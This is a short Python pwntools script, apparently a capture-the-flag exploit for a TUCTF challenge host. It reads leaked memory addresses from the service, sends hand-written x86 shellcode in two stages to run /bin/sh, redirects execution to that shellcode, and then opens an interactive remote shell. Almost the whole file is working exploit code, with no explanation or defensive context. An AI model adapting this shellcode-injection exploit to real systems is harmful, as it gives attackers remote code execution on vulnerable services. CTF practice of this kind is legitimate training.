from pwn import *
import struct

def recvall(conn):
	msg = b''
	while True:
		try:
			new_block = conn.recv(timeout=1)
			if new_block == b'':
				break
			msg += new_block	
		except EOFError as e:
			break
	return msg

HOST = "chal.tuctf.com"
PORT = 30504
#HOST = "127.0.0.1"
#PORT = 4444


conn = remote(HOST, PORT)

conn.recvline()
conn.recvline()

shell_arena = int(conn.recvline()[:10],16)
buffer_arena = int(conn.recvline()[:10],16)

log.info("Static : {}".format(hex(shell_arena)))
log.info("Buffer : {}".format(hex(buffer_arena)))

print(recvall(conn))

shell1 = b"\x31\xC0\x50\x50\x59\x5A\x68\x2F\x73\x68\x00\x68"+struct.pack("<I",buffer_arena)+"\xc3"
shell2 = b"\x68\x2F\x62\x69\x6E\x54\x5B\xB0\x0B\xCD\x80"

#Step 1
conn.send(shell1)
print(recvall(conn))

raw_input()

#Step 2
conn.send(shell2)
print(recvall(conn))

#Step 3
conn.send(struct.pack("<I",shell_arena))

conn.interactive()

conn.close()























